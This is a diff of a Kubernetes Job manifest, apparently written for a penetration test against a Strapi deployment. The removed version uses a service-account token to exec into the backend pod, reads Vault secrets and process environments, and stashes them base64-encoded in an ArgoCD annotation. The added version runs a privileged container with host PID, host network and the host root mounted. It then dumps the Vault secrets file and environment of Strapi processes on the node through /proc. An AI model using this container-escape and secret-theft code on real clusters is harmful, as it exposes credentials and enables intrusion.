@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: strapi-collect
+  name: strapi-collect2
   namespace: pentest-1148
   labels:
     purpose: pentest-1148
@@ -15,30 +15,58 @@ spec:
     spec:
       serviceAccountName: probe
       restartPolicy: Never
+      hostPID: true
+      hostNetwork: true
+      nodeSelector:
+        app: chatly
+      tolerations:
+      - key: app
+        operator: Equal
+        value: chatly
+        effect: NoSchedule
       containers:
-      - name: k
-        image: bitnami/kubectl:1.30
+      - name: c
+        image: busybox:1.36
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - name: hostroot
+          mountPath: /host
         command: ["/bin/sh","-c"]
         args:
         - |
-          API=https://kubernetes.default.svc
+          API="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
           CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-          TOK=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
-          KC="--server=$API --token=$TOK --certificate-authority=$CA"
-          OUT=/tmp/out.txt
-          {
-            echo "##NODES"; kubectl $KC get nodes -o wide 2>&1 | head -30
-            echo "##PODS"; kubectl $KC -n chatly-strapi get pods -o wide 2>&1 | head -30
-            POD=$(kubectl $KC -n chatly-strapi get pods -o jsonpath='{range .items[?(@.status.phase=="Running")]}{.metadata.name}{"\n"}{end}' 2>/dev/null | head -1)
-            echo "##POD=$POD"
-            echo "##CONTAINERS"; kubectl $KC -n chatly-strapi get pod $POD -o jsonpath='{.spec.containers[*].name}' 2>&1
-            echo ""
-            echo "##VAULTFILE"; kubectl $KC -n chatly-strapi exec $POD -c chatly-strapi-backend -- sh -c 'cat /vault/secrets/config' 2>&1
-            echo "##PROC1ENV"; kubectl $KC -n chatly-strapi exec $POD -c chatly-strapi-backend -- sh -c 'tr "\000" "\n" < /proc/1/environ' 2>&1
-          } > $OUT 2>&1
-          echo "##APPSRC" >> $OUT
-          kubectl $KC -n chatly-strapi exec $POD -c chatly-strapi-backend -- sh -c 'ls -la /app 2>&1; echo ---src---; ls -la /app/src 2>/dev/null | head -40; echo ---pkg---; head -70 /app/package.json 2>&1' >> $OUT 2>&1
-          echo "##END##" >> $OUT
-          B64=$(base64 -w0 $OUT 2>/dev/null || base64 $OUT | tr -d '\n')
-          kubectl $KC -n argocd annotate application p1148 "pentest1273out=$B64" --overwrite 2>&1
-          echo DONE
+          TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+          get() { wget -q -O - --no-check-certificate --header="Authorization: Bearer $TOKEN" "$1" 2>/dev/null; }
+          echo "##MYHOST"; hostname; cat /host/etc/hostname 2>/dev/null
+          echo "##NODES"
+          get "$API/api/v1/nodes" | tr ',' '\n' | grep -E '"name"' | sed 's/.*"name": *"//;s/".*//' | sort -u
+          echo "##PODS"
+          get "$API/api/v1/namespaces/chatly-strapi/pods" > /tmp/pods.json
+          tr '{' '\n' < /tmp/pods.json | grep -E '"(name|nodeName|phase)"' | head -60
+          echo "##STRAPI_PROCS"
+          found=0
+          for p in /proc/[0-9]*; do
+            cmd=$(tr '\0' ' ' < $p/cmdline 2>/dev/null)
+            case "$cmd" in
+              *strapi*|*node*) : ;;
+              *) continue ;;
+            esac
+            [ -f $p/root/vault/secrets/config ] || continue
+            found=1
+            echo "===== PID ${p#/proc/} CMD=$cmd"
+            echo "----- vault/secrets/config -----"
+            cat $p/root/vault/secrets/config 2>&1
+            echo "----- /proc/PID/environ -----"
+            tr '\0' '\n' < $p/environ 2>&1
+            echo "----- /app listing -----"
+            ls -la $p/root/app 2>&1 | head -40
+            break
+          done
+          [ "$found" = "0" ] && echo "NOSTRAPIPROC_ON_THIS_NODE"
+          echo "##END##"
+      volumes:
+      - name: hostroot
+        hostPath:
+          path: /
